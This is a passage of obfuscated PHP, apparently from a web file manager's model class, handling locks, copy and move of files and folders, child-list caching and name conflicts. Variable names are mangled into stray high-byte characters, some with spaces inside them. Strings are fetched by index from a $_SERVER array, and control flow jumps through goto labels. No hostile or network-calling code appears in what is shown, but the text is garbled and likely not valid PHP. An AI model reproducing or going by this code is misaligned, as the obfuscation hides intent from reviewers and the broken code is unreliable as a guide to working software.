CacheLock::lockGet($bÎˆÅÍá÷[496] . $F•´ŒÚÚº—)) { continue; } $this->_lockKey($F•´ŒÚÚº—, $Aæì«âñïŒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($f¸èÜëŒ½ğ, $Eà‹Ùæ“»¼ = 1) { $A ±½ÈòÉ¬ = $_SERVER[ÚŠ•´ÍéÒÑÔ][496] . md5($f¸èÜëŒ½ğ); if ($Eà‹Ùæ“»¼) { if (isset(self::$_lockItemArr[$A ±½ÈòÉ¬])) { return; } self::$_lockItemArr[$A ±½ÈòÉ¬] = 1; CacheLock::lock($A ±½ÈòÉ¬, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$A ±½ÈòÉ¬])) { return; } unset(self::$_lockItemArr[$A ±½ÈòÉ¬]); CacheLock::unlock($A ±½ÈòÉ¬); } } public function isParentOf($fëÈò‘£òÎ, $e†· ‹×£) { goto Fƒ¦…÷Òİ¦; Fƒ¦…÷Òİ¦: $aíÖÆ¥ôÚ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C—¦ŸÄÚ = $this->sourceInfo($fëÈò‘£òÎ); $cÃ‡‰Ä¡×œ = $this->sourceInfo($e†· ‹×£); goto E– †¨×; E– †¨×: $dêµ„‚Ò› = $C—¦ŸÄÚ[$aíÖÆ¥ôÚ[455]] . $C—¦ŸÄÚ[$aíÖÆ¥ôÚ[366]] . $aíÖÆ¥ôÚ[47]; $dŞ„’™ï˜ø = $cÃ‡‰Ä¡×œ[$aíÖÆ¥ôÚ[455]] . $cÃ‡‰Ä¡×œ[$aíÖÆ¥ôÚ[366]] . $aíÖÆ¥ôÚ[47]; $FÂêËöÌ‰ = strpos($dŞ„’™ï˜ø, $dêµ„‚Ò›) === 0; goto B¡Ÿ°ğ×¬¦; B¡Ÿ°ğ×¬¦: return $FÂêËöÌ‰; goto cÁğŸĞÍ›; cÁğŸĞÍ›: } private $targetIsDelete = 0; public function copy($F‘ÑœÔñŒ‹, $aŞÔ¨¦Ğ”, $B·öœ íî÷ = REPEAT_REPLACE, $A›İ³‘ä—¸ = '') { goto b¡•ˆèƒŠÑ; eíïí¥ÁÎø: if ($a·„í”¢…[$cÎª÷—óŸâ[367]] == $cÎª÷—óŸâ[83] && $cÃÍ‚î‚±æ == $bô¢ïõĞø) { $this->folderSizeResetChildren($cÃÍ‚î‚±æ); } Model($cÎª÷—óŸâ[500])->addAll($D§Ì¹¸Û[$cÎª÷—óŸâ[498]], array(), !0); if ($cÃÍ‚î‚±æ != $bô¢ïõĞø || $a·„í”¢…[$cÎª÷—óŸâ[367]] == $cÎª÷—óŸâ[83]) { Model($cÎª÷—óŸâ[501])->eventCopy($bô¢ïõĞø); } goto C‡ºÑÀÁ”‡; b¡•ˆèƒŠÑ: $cÎª÷—óŸâ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a·„í”¢… = $this->sourceInfo($F‘ÑœÔñŒ‹); $f¥ŸãË = $this->sourceInfo($aŞÔ¨¦Ğ”); goto eŠÒ¦Œ…Äå; cøâË‹Ñœ“: $this->targetIsDelete = intval($a·„í”¢…[$cÎª÷—óŸâ[393]]); $cÃÍ‚î‚±æ = $this->fileNameExistCache($aŞÔ¨¦Ğ”, $a·„í”¢…[$cÎª÷—óŸâ[28]]); $bô¢ïõĞø = $this->_copy($F‘ÑœÔñŒ‹, $aŞÔ¨¦Ğ”, $B·öœ íî÷, $D§Ì¹¸Û, !0, $A›İ³‘ä—¸); goto Bõªò¯à™; eŠÒ¦Œ…Äå: if (!$a·„í”¢… || !$f¥ŸãË || $f¥ŸãË[$cÎª÷—óŸâ[367]] != $cÎª÷—óŸâ[83]) { return !1; } if ($this->isParentOf($F‘ÑœÔñŒ‹, $aŞÔ¨¦Ğ”)) { return !1; } $eË‚±©¡ˆ = $A›İ³‘ä—¸ ? $A›İ³‘ä—¸ : $a·„í”¢…[$cÎª÷—óŸâ[28]]; goto aæ•²Éê‘£; b¡ÛËçÇÆÄ: $this->updateModifyTime($aŞÔ¨¦Ğ”); return $bô¢ïõĞø; goto eğ¥æÏ›«…; C‡ºÑÀÁ”‡: $this->saveAll($D§Ì¹¸Û[$cÎª÷—óŸâ[499]]); Model($cÎª÷—óŸâ[164])->linkAdd($D§Ì¹¸Û[$cÎª÷—óŸâ[497]]); $this->folderSizeReset($aŞÔ¨¦Ğ”); goto b¡ÛËçÇÆÄ; Bõªò¯à™: $this->_childrenListClear(); $this->lockCopyEnd($F‘ÑœÔñŒ‹); $this->lockWriteEnd($aŞÔ¨¦Ğ”, $eË‚±©¡ˆ); goto eíïí¥ÁÎø; aæ•²Éê‘£: $this->lockCopyStart($F‘ÑœÔñŒ‹); $this->lockWriteStart($aŞÔ¨¦Ğ”, $eË‚±©¡ˆ); $D§Ì¹¸Û = array($cÎª÷—óŸâ[497] => array(), $cÎª÷—óŸâ[498] => array(), $cÎª÷—óŸâ[499] => array()); goto cøâË‹Ñœ“; eğ¥æÏ›«…: } private function _copy($FÈÃ– ĞèÓ, $d’¯îù›Ö¡, $EÈ‹‡¨Õ, &$C¶¹Ìâæ‘ñ, $cã’’ğœ˜Š, $cŞ…¸êŠ¨³ = '') { goto e¥¥ÈÓˆ¨; e¥¥ÈÓˆ¨: $Fã¹–šé†“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $B´ù½å†ëİ = $this->sourceInfoCache($FÈÃ– ĞèÓ); $E“º÷¶´é÷ = $B´ù½å†ëİ[$Fã¹–šé†“[367]] == $Fã¹–šé†“[83]; goto d­œáˆëõˆ; FŞĞ¾²çÂö: if (!$C¥‰‹Çá‘ö) { return $this->_copyCreate($FÈÃ– ĞèÓ, $d’¯îù›Ö¡, $cÌ¹†Â™Õß, $C¶¹Ìâæ‘ñ); } $b¡º„À…½ = $C¥‰‹Çá‘ö; if ($E“º÷¶´é÷) { if ($EÈ‹‡¨Õ == REPEAT_RENAME_FOLDER) { $cÌ¹†Â™Õß = $this->fileNameAutoCache($d’¯îù›Ö¡, $cÌ¹†Â™Õß, $EÈ‹‡¨Õ, $E“º÷¶´é÷); $b¡º„À…½ = $this->_copyCreate($FÈÃ– ĞèÓ, $d’¯îù›Ö¡, $cÌ¹†Â™Õß, $C¶¹Ìâæ‘ñ); } else { $fØ‘Ğáï¶î = $this->_childrenList($FÈÃ– ĞèÓ); foreach ($fØ‘Ğáï¶î as $a‹äï‰§â) { $this->_copy($a‹äï‰§â[$Fã¹–šé†“[366]], $C¥‰‹Çá‘ö, $EÈ‹‡¨Õ, $C¶¹Ìâæ‘ñ, !1); } } } else { if ($EÈ‹‡¨Õ == REPEAT_RENAME || $EÈ‹‡¨Õ == REPEAT_RENAME_FOLDER) { $cÌ¹†Â™Õß = $this->fileNameAutoCache($d’¯îù›Ö¡, $cÌ¹†Â™Õß, $EÈ‹‡¨Õ, $E“º÷¶´é÷); $b¡º„À…½ = $this->_copyCreate($FÈÃ– ĞèÓ, $d’¯îù›Ö¡, $cÌ¹†Â™Õß, $C¶¹Ìâæ‘ñ); } else { if ($EÈ‹‡¨Õ == REPEAT_REPLACE) { $Dª¦¨¶¼·õ = $this->sourceInfoCache($C¥‰‹Çá‘ö); $BÛ•åŞªÁ… = $this->fileHistory($Dª¦¨¶¼·õ, $B´ù½å†ëİ[$Fã¹–šé†“[415]], $B´ù½å†ëİ[$Fã¹–šé†“[77]]); if ($BÛ•åŞªÁ…) { $C¶¹Ìâæ‘ñ[$Fã¹–šé†“[497]][] = $B´ù½å†ëİ[$Fã¹–šé†“[415]]; } } else { if ($EÈ‹‡¨Õ == REPEAT_SKIP) { } } } Hook::trigger($Fã¹–šé†“[502], array($Fã¹–šé†“[503], $B´ù½å†ëİ, 0)); } goto bëöÏšÒíì; d­œáˆëõˆ: $cÌ¹†Â™Õß = $cŞ…¸êŠ¨³ ? $cŞ…¸êŠ¨³ : $B´ù½å†ëİ[$Fã¹–šé†“[28]]; $C¥‰‹Çá‘ö = $this->fileNameExistCache($d’¯îù›Ö¡, $cÌ¹†Â™Õß); if ($cã’’ğœ˜Š) { $this->_childrenAllMake($FÈÃ– ĞèÓ); if ($E“º÷¶´é÷ && $C¥‰‹Çá‘ö) { $this->_childrenAllMake($C¥‰‹Çá‘ö); } } goto FŞĞ¾²çÂö; bëöÏšÒíì: return $b¡º„À…½; goto cğáíìÃæ; cğáíìÃæ: } private function _copyCreate($Fæë§¦…°ß, $EÏ±ïˆ·Ë, $BÈŠ×÷½†ß, &$E»ì’…§¢œ) { goto C‘–œĞŒ°‰; bˆ¶ÌÖöë: $f†Ò„ŒóÜğ[$Fæë§¦…°ß] = $A“à‘À‘½™; $AñãÖø°êÒ = array(); $E…åóóéíÏ = array(); goto cªàŸÕ¶¥; bÅºŒ×É‹­: $bó‡·ê´‡ø = $this->_makeItemData($fÁ™Ş†Á„, $bãŞéìÅØö, $BÈŠ×÷½†ß); Hook::trigger($d›§Áà×Ñ…[504], $bó‡·ê´‡ø); Hook::trigger($d›§Áà×Ñ…[505], array($d›§Áà×Ñ…[506], $bó‡·ê´‡ø, 0)); goto e¸İˆ­£ó¢; c§ÜÄà¬˜Õ: $this->chunkEventSet($d›§Áà×Ñ…[511], array($d›§Áà×Ñ…[512], $bó‡·ê´‡ø, $cÂÇÛğ¨Áî)); $this->saveAll($E…åóóéíÏ); return $A“à‘À‘½™; goto eŠö‹ÙäÈ; fâô‰øÑ Æ: $this->_childrenListAll($Fæë§¦…°ß, $Dù™Ê¨ ŠÇ); $cÂÇÛğ¨Áî = count($Dù™Ê¨ ŠÇ); if ($cÂÇÛğ¨Áî == 0) { return $A“à‘À‘½™; } goto F¿“Š­°§; AÒáÊ–³ÂÄ: $this->addAll($fì¯†ç¸Ü, array(), !1); $eÖ¬ÆÍùÖÖ = $this->where(array($d›§Áà×Ñ…[457] => $A“à‘À‘½™))->select(); $f†Ò„ŒóÜğ = $this->_childrenMakeRelation($Dù™Ê¨ ŠÇ, $eÖ¬ÆÍùÖÖ); goto bˆ¶ÌÖöë; cÄ²Ê¦Å‡Š: if ($fÁ™Ş†Á„[$d›§Áà×Ñ…[367]] != $d›§Áà×Ñ…[83]) { $E»ì’…§¢œ[$d›§Áà×Ñ…[497]][] = $fÁ™Ş†Á„[$d›§Áà×Ñ…[415]]; return $A“à‘À‘½™; } $Dù™Ê¨ ŠÇ = array(); $fì¯†ç¸Ü = array(); goto fâô‰øÑ Æ; C‘–œĞŒ°‰: $d›§Áà×Ñ… =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÁ™Ş†Á„ = $this->sourceInfoCache($Fæë§¦…°ß); $bãŞéìÅØö = $this->sourceInfoCache($EÏ±ïˆ·Ë); goto bÅºŒ×É‹­; e¸İˆ­£ó¢: $A“à‘À‘½™ = $this->add($bó‡·ê´‡ø); $DÆƒºöò“¦ = array($d›§Áà×Ñ…[366] => $A“à‘À‘½™, $d›§Áà×Ñ…[28] => $BÈŠ×÷½†ß); $this->_copyApplyMeta($DÆƒºöò“¦, $E»ì’…§¢œ); goto cÄ²Ê¦Å‡Š; cªàŸÕ¶¥: foreach ($eÖ¬ÆÍùÖÖ as $Bª ã¾Ç±©) { $F‹”éŠªÎ‡ = $Bª ã¾Ç±©[$d›§Áà×Ñ…[366]]; $E‘²Ì‚•­µ = $this->_childrenMatch($f†Ò„ŒóÜğ, $Bª ã¾Ç±©, $aõÖ¡Ê¬‹); $AñãÖø°êÒ[] = array($d›§Áà×Ñ…[366], $F‹”éŠªÎ‡, $d›§Áà×Ñ…[457], $E‘²Ì‚•­µ[$d›§Áà×Ñ…[457]]); $E…åóóéíÏ[] = array($d›§Áà×Ñ…[366], $F‹”éŠªÎ‡, $d›§Áà×Ñ…[455], $E‘²Ì‚•­µ[$d›§Áà×Ñ…[455]]); $this->_copyApplyMeta($Bª ã¾Ç±©, $E»ì’…§¢œ); if ($Bª ã¾Ç±©[$d›§Áà×Ñ…[367]] != $d›§Áà×Ñ…[83]) { $E»ì’…§¢œ[$d›§Áà×Ñ…[497]][] = $Bª ã¾Ç±©[$d›§Áà×Ñ…[415]]; } } $this->chunkEventSet($d›§Áà×Ñ…[509], array($d›§Áà×Ñ…[510], $bó‡·ê´‡ø, $cÂÇÛğ¨Áî)); $this->saveAll($AñãÖø°êÒ); goto c§ÜÄà¬˜Õ; F¿“Š­°§: $aõÖ¡Ê¬‹ = $this->sourceInfo($A“à‘À‘½™); foreach ($Dù™Ê¨ ŠÇ as $Bª ã¾Ç±©) { $A¦®ªğ Ç³ = $this->_makeItemData($Bª ã¾Ç±©, $aõÖ¡Ê¬‹, $Bª ã¾Ç±©[$d›§Áà×Ñ…[28]]); $A¦®ªğ Ç³[$d›§Áà×Ñ…[455]] = $Bª ã¾Ç±©[$d›§Áà×Ñ…[455]]; $fì¯†ç¸Ü[] = $A¦®ªğ Ç³; } $this->chunkEventSet($d›§Áà×Ñ…[507], array($d›§Áà×Ñ…[508], $bó‡·ê´‡ø, $cÂÇÛğ¨Áî)); goto AÒáÊ–³ÂÄ; eŠö‹ÙäÈ: } private function _childrenMakeRelation($dé©ŒŒ½çî, $eï‰½ººÙŒ) { $D­ëŒ¡ğÄ­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÎÑÔ‡ßƒÖ = array(); $A¿˜ç‚˜Ã = array(); foreach ($dé©ŒŒ½çî as $a„­İ¦µğ) { $F©ÚÎÚŒ¡ = $a„­İ¦µğ[$D­ëŒ¡ğÄ­[28]] . $D­ëŒ¡ğÄ­[8] . $a„­İ¦µğ[$D­ëŒ¡ğÄ­[455]]; $EÎÑÔ‡ßƒÖ[$F©ÚÎÚŒ¡] = $a„­İ¦µğ[$D­ëŒ¡ğÄ­[366]]; } foreach ($eï‰½ººÙŒ as $a„­İ¦µğ) { $F©ÚÎÚŒ¡ = $a„­İ¦µğ[$D­ëŒ¡ğÄ­[28]] . $D­ëŒ¡ğÄ­[8] . $a„­İ¦µğ[$D­ëŒ¡ğÄ­[455]]; $e˜Óø„›ƒ = $EÎÑÔ‡ßƒÖ[$F©ÚÎÚŒ¡]; $A¿˜ç‚˜Ã[$e˜Óø„›ƒ] = $a„­İ¦µğ[$D­ëŒ¡ğÄ­[366]]; } return $A¿˜ç‚˜Ã; } private function _childrenMatch($e¨¾çĞÒÃö, $f‡…Ã—æï¾, $c¿Ë‰ì˜¹) { goto b‘³¸ó¦ïÖ; a¤¯÷£½”İ: $fğÜˆ¶¡ = $A™¦Õ­ñÏ‡[count($A™¦Õ­ñÏ‡) - 1]; return array($C²ÔÔÎÊÆä[457] => $fğÜˆ¶¡, $C²ÔÔÎÊÆä[455] => $eëÓ¨™ø£ô); goto CŒŸñÔ–ÃÒ; b‘³¸ó¦ïÖ: $C²ÔÔÎÊÆä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eëÓ¨™ø£ô = $c¿Ë‰ì˜¹[$C²ÔÔÎÊÆä[455]]; $E¦µìîˆˆ£ = $this->parentLevelArray($f‡…Ã—æï¾[$C²ÔÔÎÊÆä[455]]); goto Eà›¹ì¥‹; Eà›¹ì¥‹: foreach ($E¦µìîˆˆ£ as $a˜½ËÁ­Ï÷) { if (isset($e¨¾çĞÒÃö[$a˜½ËÁ­Ï÷])) { $eëÓ¨™ø£ô .= $e¨¾çĞÒÃö[$a˜½ËÁ­Ï÷] . $C²ÔÔÎÊÆä[513]; } } $eëÓ¨™ø£ô = rtrim($eëÓ¨™ø£ô, $C²ÔÔÎÊÆä[47]) . $C²ÔÔÎÊÆä[47]; $A™¦Õ­ñÏ‡ = $this->parentLevelArray($eëÓ¨™ø£ô); goto a¤¯÷£½”İ; CŒŸñÔ–ÃÒ: } private function _makeItemData($AÕÔ³–Éƒó, $AÊÇ‰šã, $FÂÎñ‚ô) { $bÒš”¼ÈóÆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e×ÒÏ¼–Û = array($bÒš”¼ÈóÆ[514] => $AÕÔ³–Éƒó[$bÒš”¼ÈóÆ[367]], $bÒš”¼ÈóÆ[383] => $FÂÎñ‚ô, $bÒš”¼ÈóÆ[515] => $AÕÔ³–Éƒó[$bÒš”¼ÈóÆ[369]], $bÒš”¼ÈóÆ[416] => $AÕÔ³–Éƒó[$bÒš”¼ÈóÆ[415]], $bÒš”¼ÈóÆ[516] => $AÕÔ³–Éƒó[$bÒš”¼ÈóÆ[77]], $bÒš”¼ÈóÆ[517] => $AÊÇ‰šã[$bÒš”¼ÈóÆ[368]], $bÒš”¼ÈóÆ[518] => $AÊÇ‰šã[$bÒš”¼ÈóÆ[452]], $bÒš”¼ÈóÆ[519] => USER_ID, $bÒš”¼ÈóÆ[520] => USER_ID, $bÒš”¼ÈóÆ[365] => $AÊÇ‰šã[$bÒš”¼ÈóÆ[366]], $bÒš”¼ÈóÆ[521] => $AÊÇ‰šã[$bÒš”¼ÈóÆ[455]] . $AÊÇ‰šã[$bÒš”¼ÈóÆ[366]] . $bÒš”¼ÈóÆ[47], $bÒš”¼ÈóÆ[392] => 0, $bÒš”¼ÈóÆ[522] => $bÒš”¼ÈóÆ[33]); return $e×ÒÏ¼–Û; } private function _copyApplyMeta($b·ßØ÷¢éÉ, &$Eïã…”øÒÔ) { $CéŸÅ¨ÂÊÎ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fæöë”±ê = $b·ßØ÷¢éÉ[$CéŸÅ¨ÂÊÎ[366]]; $B¡õ¸ÄÆ† = $b·ßØ÷¢éÉ[$CéŸÅ¨ÂÊÎ[28]]; if (!isset($b·ßØ÷¢éÉ[$CéŸÅ¨ÂÊÎ[523]]) || !$b·ßØ÷¢éÉ[$CéŸÅ¨ÂÊÎ[523]] || $b·ßØ÷¢éÉ[$CéŸÅ¨ÂÊÎ[523]] == $CéŸÅ¨ÂÊÎ[464]) { $Eïã…”øÒÔ[$CéŸÅ¨ÂÊÎ[499]][] = array($CéŸÅ¨ÂÊÎ[366], $fæöë”±ê, $CéŸÅ¨ÂÊÎ[523], short_id($fæöë”±ê)); } if (Input::check($B¡õ¸ÄÆ†, $CéŸÅ¨ÂÊÎ[524])) { $Eïã…”øÒÔ[$CéŸÅ¨ÂÊÎ[498]][] = array($CéŸÅ¨ÂÊÎ[366] => $fæöë”±ê, $CéŸÅ¨ÂÊÎ[89] => $CéŸÅ¨ÂÊÎ[412], $CéŸÅ¨ÂÊÎ[356] => str_replace($CéŸÅ¨ÂÊÎ[50], $CéŸÅ¨ÂÊÎ[33], Pinyin::encode($B¡õ¸ÄÆ†))); $Eïã…”øÒÔ[$CéŸÅ¨ÂÊÎ[498]][] = array($CéŸÅ¨ÂÊÎ[366] => $fæöë”±ê, $CéŸÅ¨ÂÊÎ[89] => $CéŸÅ¨ÂÊÎ[411], $CéŸÅ¨ÂÊÎ[356] => Pinyin::encode($B¡õ¸ÄÆ†, $CéŸÅ¨ÂÊÎ[525])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($B÷‘êĞ„ğ) { goto AÛ¸ÜÙ˜ÉŒ; DÜóÉ¥š: $F™¿ÅƒÚ¤‹ = array_to_keyvalue($F™¿ÅƒÚ¤‹, $aˆ¿¬ÈÃ£î[366]); foreach ($F™¿ÅƒÚ¤‹ as $CÃßÏÊ†±¦) { $DÙä…£¯ô = $CÃßÏÊ†±¦[$aˆ¿¬ÈÃ£î[457]]; $B÷‘êĞ„ğ = $CÃßÏÊ†±¦[$aˆ¿¬ÈÃ£î[366]]; if (!isset($this->_childrenListCache[$B÷‘êĞ„ğ]) && $CÃßÏÊ†±¦[$aˆ¿¬ÈÃ£î[367]] == $aˆ¿¬ÈÃ£î[83]) { $this->_childrenListCache[$B÷‘êĞ„ğ] = array(); } if (!isset($this->_childrenListCache[$DÙä…£¯ô])) { $this->_childrenListCache[$DÙä…£¯ô] = array(); } $this->_childrenListCache[$DÙä…£¯ô][$B÷‘êĞ„ğ] = $CÃßÏÊ†±¦; $this->_childrenItemCache[$B÷‘êĞ„ğ] = $CÃßÏÊ†±¦; } goto Bå—º‡™ÒÍ; AÛ¸ÜÙ˜ÉŒ: $aˆ¿¬ÈÃ£î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DœµÃÑÎ˜¸ = $this->sourceInfo($B÷‘êĞ„ğ); $Dò®¢“Ó² = $aˆ¿¬ÈÃ£î[526]; goto dÀÆÈ©¼£; dÀÆÈ©¼£: $Dáôù®ğ  = array($aˆ¿¬ÈÃ£î[455] => array($aˆ¿¬ÈÃ£î[479], $DœµÃÑÎ˜¸[$aˆ¿¬ÈÃ£î[455]] . $B÷‘êĞ„ğ . $aˆ¿¬ÈÃ£î[480]), $aˆ¿¬ÈÃ£î[393] => $this->targetIsDelete); $F™¿ÅƒÚ¤‹ = $this->field($Dò®¢“Ó²)->where($Dáôù®ğ )->select(); if (!$F™¿ÅƒÚ¤‹) { return; } goto DÜóÉ¥š; Bå—º‡™ÒÍ: } private function _childrenListAll($FÚŒ‰‚øİ¸, &$B–´ÛÀˆ³½) { $BÏ–„‚÷ÄÂ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!isset($this->_childrenListCache[$FÚŒ‰‚øİ¸])) { return; } $d¬Ñ­¶Ó¤— = $this->_childrenListCache[$FÚŒ‰‚øİ¸]; foreach ($d¬Ñ­¶Ó¤— as $D©·÷ŸõÉİ => $Cåè÷Áî„Ğ) { $B–´ÛÀˆ³½[$D©·÷ŸõÉİ] = $Cåè÷Áî„Ğ; if ($Cåè÷Áî„Ğ[$BÏ–„‚÷ÄÂ[367]] == $BÏ–„‚÷ÄÂ[83]) { $this->_childrenListAll($D©·÷ŸõÉİ, $B–´ÛÀˆ³½); } } } private function sourceInfoCache($D´õ³Ô§Ó) { if (isset($this->_childrenItemCache[$D´õ³Ô§Ó])) { return $this->_childrenItemCache[$D´õ³Ô§Ó]; } return $this->sourceInfo($D´õ³Ô§Ó); } private function _childrenList($F¿¢Íâ“ŞÔ) { if (isset($this->_childrenListCache[$F¿¢Íâ“ŞÔ])) { return $this->_childrenListCache[$F¿¢Íâ“ŞÔ]; } return $this->_childrenListSelect($F¿¢Íâ“ŞÔ); } private function _childrenListSelect($F¤šŞ«èÈ) { goto Dá’ŸÂäÀ­; Dá’ŸÂäÀ­: $Fƒøßä¬Õ÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CÒ„·»Âª¨ = array($Fƒøßä¬Õ÷[457] => $F¤šŞ«èÈ, $Fƒøßä¬Õ÷[393] => $this->targetIsDelete); $a½ŒŒéŸñ = $this->where($CÒ„·»Âª¨)->select(); goto b¡Ã©×çœÁ; b¡Ã©×çœÁ: $a½ŒŒéŸñ = $a½ŒŒéŸñ ? $a½ŒŒéŸñ : array(); $EÁƒ‹„é¼‚ = array_to_keyvalue($a½ŒŒéŸñ, $Fƒøßä¬Õ÷[366]); $this->_childrenListCache[$F¤šŞ«èÈ] = $EÁƒ‹„é¼‚; goto BíâÚñŒ¬¨; BíâÚñŒ¬¨: foreach ($EÁƒ‹„é¼‚ as $F¤šŞ«èÈ => $eãÛ˜ï“¼) { $this->_childrenItemCache[$F¤šŞ«èÈ] = $eãÛ˜ï“¼; } return $EÁƒ‹„é¼‚; goto Cœ¸‘½­ê; Cœ¸‘½­ê: } private function fileNameExistCache($fŒ‹²„ùÄ¢, $BÔÅ‚’‹çÃ) { $bóÀïğù…Å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÔÅ‚’‹çÃ = strtolower($BÔÅ‚’‹çÃ); $DÓÖš²øÛ„ = $this->_childrenList($fŒ‹²„ùÄ¢); foreach ($DÓÖš²øÛ„ as $eôÀ„Œ‡Äà) { if ($BÔÅ‚’‹çÃ == strtolower($eôÀ„Œ‡Äà[$bóÀïğù…Å[28]])) { return $eôÀ„Œ‡Äà[$bóÀïğù…Å[366]]; } } return !1; } private function fileNameAutoCache($e§¶ø…İ·Ã, $C¸ÑìÒĞ •, $aƒâÓµßŸÅ, $E‡Â ÛíÜ„) { $e…Š·æ²ô½ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cÙù»—æİé = $this->_childrenList($e§¶ø…İ·Ã); $a‰·›ööƒ× = array_to_keyvalue($cÙù»—æİé, $e…Š·æ²ô½[33], $e…Š·æ²ô½[28]); return $this->fileNameAutoGet($a‰·›ööƒ×, $C¸ÑìÒĞ •, $aƒâÓµßŸÅ, $E‡Â ÛíÜ„); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($AÂ¶œˆ²¼, $E‘¡œîé‚Ğ, $DÄ¼ĞùÍÀ = REPEAT_REPLACE, $f˜›±Â¬öÁ = '') { goto bÌ‰ˆ™¦¿‘; Aæ¨©êóÌÆ: $Bºâ¬›ÖÔ‡ = $this->_move($AÂ¶œˆ²¼, $E‘¡œîé‚Ğ, $DÄ¼ĞùÍÀ, $eÌİğÁë´õ, $f˜›±Â¬öÁ); $this->sourceCacheClear(); if ($AİøØîšé’[$A¹óøóï™[367]] == $A¹óøóï™[83] && $aÜ…ç´‰) { $this->folderSizeResetChildren($Bºâ¬›ÖÔ‡); } goto fƒ‹Ó’ØÇØ; Eš¨•—õÑ: Model($A¹óøóï™[501])->eventMove($AÂ¶œˆ²¼, $AİøØîšé’[$A¹óøóï™[457]], $E‘¡œîé‚Ğ); Hook::trigger($A¹óøóï™[528], $eÀËÄ§˜é); return $Bºâ¬›ÖÔ‡; goto C–Ş¦‘Ãê; bÌ‰ˆ™¦¿‘: $A¹óøóï™ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AİøØîšé’ = $this->sourceInfo($AÂ¶œˆ²¼); $Ağ½ÇÕ¹ = $this->sourceInfo($E‘¡œîé‚Ğ); goto a½ã…Â¢Ê; B¢Éë±îŒ¸: $this->lockWriteEnd($E‘¡œîé‚Ğ, $C³»ìƒ´õ‡); $this->folderSizeReset($AİøØîšé’[$A¹óøóï™[457]]); $this->folderSizeReset($E‘¡œîé‚Ğ); goto EøÍÉ‡’¿Æ; BÕ–µ¥¦‚½: $C³»ìƒ´õ‡ = $f˜›±Â¬öÁ ? $f˜›±Â¬öÁ : $AİøØîšé’[$A¹óøóï™[28]]; $this->lockMoveStart($AÂ¶œˆ²¼); $this->lockWriteStart($E‘¡œîé‚Ğ, $C³»ìƒ´õ‡); goto bªÊÇÈÍ‹Ì; bªÊÇÈÍ‹Ì: $eÌİğÁë´õ = array($A¹óøóï™[497] => array(), $A¹óøóï™[529] => !1); $this->clearShare($AÂ¶œˆ²¼, $E‘¡œîé‚Ğ); $aÜ…ç´‰ = $this->fileNameExistCache($E‘¡œîé‚Ğ, $AİøØîšé’[$A¹óøóï™[28]]); goto Aæ¨©êóÌÆ; fƒ‹Ó’ØÇØ: Model($A¹óøóï™[164])->linkAdd($eÌİğÁë´õ[$A¹óøóï™[497]]); if ($aÜ…ç´‰ && $eÌİğÁë´õ[$A¹óøóï™[529]]) { $this->removeNow($AÂ¶œˆ²¼, !1); } $this->lockMoveEnd($AÂ¶œˆ²¼); goto B¢Éë±îŒ¸; EøÍÉ‡’¿Æ: $FëŒ‰ŒÀÓŒ = array($AİøØîšé’[$A¹óøóï™[457]], $E‘¡œîé‚Ğ); if ($AİøØîšé’[$A¹óøóï™[367]] == $A¹óøóï™[83]) { $FëŒ‰ŒÀÓŒ[] = $AÂ¶œˆ²¼; } $this->updateModifyTime($FëŒ‰ŒÀÓŒ); goto Eš¨•—õÑ; cÏ®•¤„â: Hook::trigger($A¹óøóï™[527], $eÀËÄ§˜é); $this->targetIsDelete = intval($AİøØîšé’[$A¹óøóï™[393]]); if ($AİøØîšé’[$A¹óøóï™[457]] == $E‘¡œîé‚Ğ && $f˜›±Â¬öÁ != $AİøØîšé’[$A¹óøóï™[28]]) { $f“İ¨†á = $this->fileNameExist($E‘¡œîé‚Ğ, $f˜›±Â¬öÁ); if ($f“İ¨†á && $AİøØîšé’[$A¹óøóï™[367]] == $A¹óøóï™[464]) { goto fâ„ˆ øö§; Eç±ñŞ¼õØ: $this->removeNow($AÂ¶œˆ²¼, !1); $this->folderSizeReset($E‘¡œîé‚Ğ); Hook::trigger($A¹óøóï™[528], $eÀËÄ§˜é); goto cºØØ¼Â¨ˆ; cºØØ¼Â¨ˆ: return $f“İ¨†á; goto d·Ñª¥²ã‹; fâ„ˆ øö§: $d¯¤¼’¤» = $this->sourceInfo($f“İ¨†á); $AÁÊ”ˆÔ© = $this->fileHistory($d¯¤¼’¤», $AİøØîšé’[$A¹óøóï™[415]], $AİøØîšé’[$A¹óøóï™[77]]); if (!$AÁÊ”ˆÔ©) { Model($A¹óøóï™[418])->remove($AİøØîšé’[$A¹óøóï™[415]]); } goto Eç±ñŞ¼õØ; d·Ñª¥²ã‹: } } goto BÕ–µ¥¦‚½; a½ã…Â¢Ê: $eÀËÄ§˜é = $this->pathInfoMore($AÂ¶œˆ²¼); if ($this->isParentOf($AÂ¶œˆ²¼, $E‘¡œîé‚Ğ)) { return !1; } if (!$AİøØîšé’ || !$Ağ½ÇÕ¹ || $Ağ½ÇÕ¹[$A¹óøóï™[367]] != $A¹óøóï™[83]) { return !1; } goto cÏ®•¤„â; C–Ş¦‘Ãê: } private function _move($b´‡Ó…é¥, $a ÌŠäÕİ, $E‹®ğ…³Â, &$cÇ«÷¦ƒÖÜ, $fˆÚµÈ“Û± = '') { goto FÙù‘«‚‚†; b‚ãÙÔ™İ¯: $CÏ×Û·³Š = $fˆÚµÈ“Û± ? $fˆÚµÈ“Û± : $BÓ”÷á„á[$cºÄƒœåÆ›[28]]; $A…»ĞÇô³ = $this->fileNameExistCache($a ÌŠäÕİ, $CÏ×Û·³Š); 